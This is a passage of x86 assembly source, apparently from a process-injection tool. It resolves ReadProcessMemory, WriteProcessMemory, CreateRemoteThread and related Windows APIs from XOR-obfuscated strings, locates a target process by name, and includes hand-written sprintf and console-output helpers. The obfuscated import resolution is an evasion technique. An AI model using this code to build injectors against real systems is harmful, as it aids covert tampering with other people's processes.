    push dword 0
    push dword read_process_memory_xor.len
    push dword read_process_memory_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [read_process_memory], eax              ; ReadProcessMemory addr

    push dword 0
    push dword write_process_memory_xor.len
    push dword write_process_memory_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [write_process_memory], eax             ; WriteProcessMemory addr

    push dword 0
    push dword create_remote_thread_xor.len
    push dword create_remote_thread_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [create_remote_thread], eax             ; CreateRemoteThread addr
     
    push dword 0
    push dword wait_for_single_object_xor.len
    push dword wait_for_single_object_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [wait_for_single_object], eax           ; WaitForSingleObject addr
 
    push dword 0
    push dword close_handle_xor.len
    push dword close_handle_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [close_handle], eax                     ; CloseHandle addr

    push dword 0
    push dword create_toolhelp32_snapshot_xor.len
    push dword create_toolhelp32_snapshot_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [create_toolhelp32_snapshot], eax       ; CreateToolhelp32Snapshot addr

    push dword 0
    push dword process32_first_xor.len
    push dword process32_first_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [process32_first], eax                  ; Process32First addr

    push dword 0
    push dword process32_next_xor.len
    push dword process32_next_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [process32_next], eax                   ;  Process32Next addr

    push dword 0
    push dword sleep_xor.len
    push dword sleep_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [sleep], eax                            ; Sleep addr

    push dword 0
    push dword resume_thread_xor.len
    push dword resume_thread_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [resume_thread], eax                    ; ResumeThread addr

    push dword 0
    push dword output_debug_string_a_xor.len
    push dword output_debug_string_a_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [output_debug_string_a], eax            ; OutputDebugStringA addr

.shutdown:
    leave
    ret 4


; arg0: proc name       ebp + 8
;
; ret: proc id          eax
find_target_process_id:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = snapshot handle
    ; ebp - 304 = process entry struct
    sub esp, 304                                ; allocate locate variable space

    mov dword [ebp - 4], 0                      ; return value

    push 0
    push TH32CS_SNAPPROCESS
    call [create_toolhelp32_snapshot]           ; snapshot handle

    cmp eax, INVALID_HANDLE_VALUE
    je .shutdown

    mov [ebp - 8], eax                          ; snapshot handle
    mov dword [ebp - 304], 296                  ; processentry32.dwsize

    mov eax, ebp
    sub eax, 304                                ; &processentry
    push eax
    push dword [ebp - 8]                        ; snapshot handle 
    call [process32_first]

    cmp eax, 0                                  ; if !process32First
    je .shutdown

.loop:
    mov eax, ebp
    sub eax, 304                                ; &processentry
    push eax
    push dword [ebp - 8]                        ; snapshot handle 
    call [process32_next]

    cmp eax, 0
    je .loop_end

    mov eax, ebp
    sub eax, 304                                ; processEntry32
    add eax, 36                                 ; processEntry32.szExeFile
    push eax
    push dword [ebp + 8]                        ; proc name
    call strcmpiAA

    cmp eax, 1                                  ; are strings equal
    je .process_found

    jmp .loop

.process_found:
    mov eax, ebp
    sub eax, 304                                ; *processentry32
    add eax, 8                                  ; processentry32->procID

    mov eax, [eax]
    mov [ebp - 4], eax                          ; return value

    jmp .shutdown
.loop_end:

.shutdown:

    mov eax, [ebp - 4]                          ; return value

    leave
    ret 4

; arg0: ptr to buffer               ebp + 8
; arg1: ptr to str                  ebp + 12
; arg2 ....: args to sprintf        ebp + 16 ...
sprintf:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = esi
    ; ebp - 12 = edi
    ; ebp - 16 = place holder count
    ; ebp - 20 = offset from ebp
    ; ebp - 24 = number of bits to shift right
    ; ebp - 28 = ebx
    ; ebp - 32 = quotient from print decimal division
    ; ebp - 44 = temp buffer for decimal conversion (10 digits) + 2 byte padding
    ; ebp - 48 = temp save esi for decimal conversion
    ; ebp - 52 = temp save edi for decimal conversion
    ; ebp - 56 = arg size (db, xb = 1, dw, xw = 2, dd, xd = 4), used to point to the next arg by adding to offset from ebp, currently passing 4 for all to keep OutputDebugStringA from crashing !?!?
    sub esp, 56                             ; allocate local variable space

    mov dword [ebp - 4], 0                  ; return value
    mov [ebp - 8], esi                      ; save esi
    mov [ebp - 12], edi                     ; save edi
    mov dword [ebp - 16], 0                 ; place holder count
    mov [ebp - 28], ebx                     ; save ebx

    mov dword [ebp - 20], 16                ; offset from ebp

    mov esi, [ebp + 12]                     ; ptr to str
    mov edi, [ebp + 8]                      ; ptr to buffer

.loop:
    lodsb

    cmp al, '%'
    je .process_placeholder

    stosb

    cmp al, 0
    je .end_of_loop

    jmp .loop

    .process_placeholder:
        lodsb

        cmp al, 's'
        je .print_string

        cmp al, 'd'
        je .print_decimal

        cmp al, 'x'
        je .print_hex

        stosb                               ; not a placeholder, must be a string, copy it

        jmp .loop

        .print_string:
            lodsb

            cmp al, 'b'
            je .print_single_byte_char

            cmp al, 'w'
            je .print_double_byte_char

            jmp .loop

            .print_single_byte_char:
                ; copy arg string to the buffer
                mov eax, [ebp - 20]             ; offset from ebp
                push edi
                push dword [ebp + eax]          ; arg
                call strcpy

                ; find strlen to get edi to the end of the str in buffer
                mov eax, [ebp - 20]             ; offset from ebp
                push dword [ebp + eax]          ; arg
                call strlen                     ; str len in eax

                add edi, eax

                add dword [ebp - 20], 4         ; offset from ebp
                inc dword [ebp - 16]            ; placeholder count
                jmp .loop

            .print_double_byte_char:
                ; copy arg string to the buffer
                mov eax, [ebp - 20]             ; offset from ebp
                push edi
                push dword [ebp + eax]          ; arg
                call wstrcpya

                ; find strlen to get edi to the end of the str in buffer
                mov eax, [ebp - 20]             ; offset from ebp
                push dword [ebp + eax]          ; arg
                call wstrlen                    ; str len in eax

                add edi, eax

                add dword [ebp - 20], 4         ; offset from ebp
                inc dword [ebp - 16]            ; placeholder count
                jmp .loop

        .print_decimal:
            lodsb

            cmp al, 'b'
            je .print_decimal_byte

            cmp al, 'w'
            je .print_decimal_word

            cmp al, 'd'
            je .print_decimal_dword

            jmp .loop

            .print_decimal_byte:
                mov eax, [ebp - 20]                         ; offset from ebp
                movzx eax, byte [ebp + eax]                 ; arg
                mov dword [ebp - 56], 1                     ; arg size
                jmp .continue_from_decimal_data_size_check
            .print_decimal_word:
                mov eax, [ebp - 20]                         ; offset from ebp
                movzx eax, word [ebp + eax]                 ; arg
                mov dword [ebp - 56], 2                     ; arg size
                jmp .continue_from_decimal_data_size_check
            .print_decimal_dword:
                mov eax, [ebp - 20]                         ; offset from ebp
                mov eax, [ebp + eax]                        ; arg
                mov dword [ebp - 56], 4                     ; arg size
                jmp .continue_from_decimal_data_size_check

            .continue_from_decimal_data_size_check:

            mov ecx, 10                                     ; divisor
            xor ebx, ebx                                    ; number of digits in the decimal

            mov [ebp - 48], esi                             ; temp save esi
            mov [ebp - 52], edi                             ; temp save edi

            mov edi, ebp
            sub edi, 33                                     ; temp buffer for digits (reverse)
            std                                             ; set direction flag since the digits are written in reverse order

            .print_decimal_loop:
                xor edx, edx
                div ecx

                mov [ebp - 32], eax                         ; save quotient
                mov eax, edx                                ; remainder
                add eax, 48                                 ; ascii value of integer

                stosb

                mov eax, [ebp - 32]                         ; restore quotient
                
                inc ebx
                cmp eax, 0
                jne .print_decimal_loop

            mov edi, [ebp - 52]                             ; temp restore edi

            cld                                             ; clear direction flag

            mov esi, ebp
            sub esi, 32                                     ; temp buffer for digits (reverse)
            sub esi, ebx

            .final_copy_loop:
                movsb

                dec ebx
                jnz .final_copy_loop

            mov esi, [ebp - 48]                             ; temp restore esi
            inc dword [ebp - 16]                            ; placeholder count
            add dword [ebp - 20], 4                         ; offset from ebp
            jmp .loop

        .print_hex:
            lodsb

            cmp al, 'b'
            je .print_hex_byte

            cmp al, 'w'
            je .print_hex_word

            cmp al, 'd'
            je .print_hex_dword

            jmp .loop

            .print_hex_byte:
                mov dword [ebp - 24], 8                     ; start with 8 bits to shift right
                mov dword [ebp - 56], 1                     ; arg size
                jmp .continue_from_hex_data_size_check
            .print_hex_word:
                mov dword [ebp - 24], 16                    ; start with 16 bits to shift right
                mov dword [ebp - 56], 2                     ; arg size
                jmp .continue_from_hex_data_size_check
            .print_hex_dword:
                mov dword [ebp - 24], 32                    ; start with 32 bits to shift right
                mov dword [ebp - 56], 4                     ; arg size
                jmp .continue_from_hex_data_size_check

            .continue_from_hex_data_size_check:

            mov edx, hex_digits

            .print_hex_loop:
                cmp dword [ebp - 56], 1                     ; arg size
                je .copy_byte

                cmp dword [ebp - 56], 2                     ; arg size
                je .copy_word

                cmp dword [ebp - 56], 4                     ; arg size
                je .copy_dword

                .copy_byte:
                    mov eax, [ebp - 20]                     ; offset from ebp
                    movzx eax, byte [ebp + eax]             ; arg
                    jmp .continue_from_copy

                .copy_word:
                    mov eax, [ebp - 20]                     ; offset from ebp
                    movzx eax, word [ebp + eax]             ; arg
                    jmp .continue_from_copy

                .copy_dword:
                    mov eax, [ebp - 20]                     ; offset from ebp
                    mov eax, [ebp + eax]                    ; arg
                    jmp .continue_from_copy

                .continue_from_copy:

                    sub dword [ebp - 24], 4                 ; nbits to shift right
                    mov ecx, [ebp - 24]                     ; nbits to shift right

                    shr eax, cl                             ; shift right and 'and', so just the nibble is left in al
                    and al, 0x0f

                    movzx ebx, byte al
                    mov al, [edx + ebx]                     ; the corresponding 'letter' in al

                    stosb

                    cmp dword [ebp - 24], 0                 ; nbits to shift right
                    jne .print_hex_loop

            inc dword [ebp - 16]                            ; placeholder count
            add dword [ebp - 20], 4                         ; offset from ebp
            jmp .loop

.end_of_loop:

.shutdown:

    mov ebx, [ebp - 28]                 ; restore ebx
    mov edi, [ebp - 12]                 ; restore edi
    mov esi, [ebp - 8]                  ; restore esi
    mov eax, [ebp - 4]                  ; return value

    leave
    ret                                 ; no stack clearing here, since this is a special variadic function, callee cannot know how many args have been passed, cleared by caller

; arg0: handle              ebp + 8
; arg0: ptr to string       ebp + 12
print_string:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    sub esp, 4                      ; allocate local variable space

    mov dword [ebp - 4], 0          ; return value

    push dword [ebp + 12]           ; ptr to str
    call strlen

    push 0
    push 0
    push eax                        ; str len
    push dword [ebp + 12]           ; ptr to str
    push dword [ebp + 8]            ; std handle
    call [write_file]

.shutdown:
    mov eax, [ebp - 4]              ; return value

    leave
    ret 12

; arg0: ptr to str          [ebp + 8]
print_console:
        push ebp
        mov ebp, esp

        ; ebp - 4 = return value
        ; ebp - 8 = strlen
        ; ebp - 12 = std handle
        sub esp, 12                             ; allocate local variable space

        mov dword [ebp - 4], 0                  ; return value

        ; calculate str len
        push dword [ebp + 8]                    ; ptr to str
        call strlen
        mov [ebp - 8], eax                      ; strlen

        push STD_HANDLE_ENUM
        call [get_std_handle]

        mov [ebp - 12], eax                     ; std handle

        push dword 0
        push dword 0
        push dword [ebp - 8]                    ; str len
        push dword [ebp + 8]                    ; ptr to str
        push dword [ebp - 12]                   ; std handle
        call [write_file]

    .shutdown:

        mov eax, [ebp - 4]                      ; return value

        leave
        ret
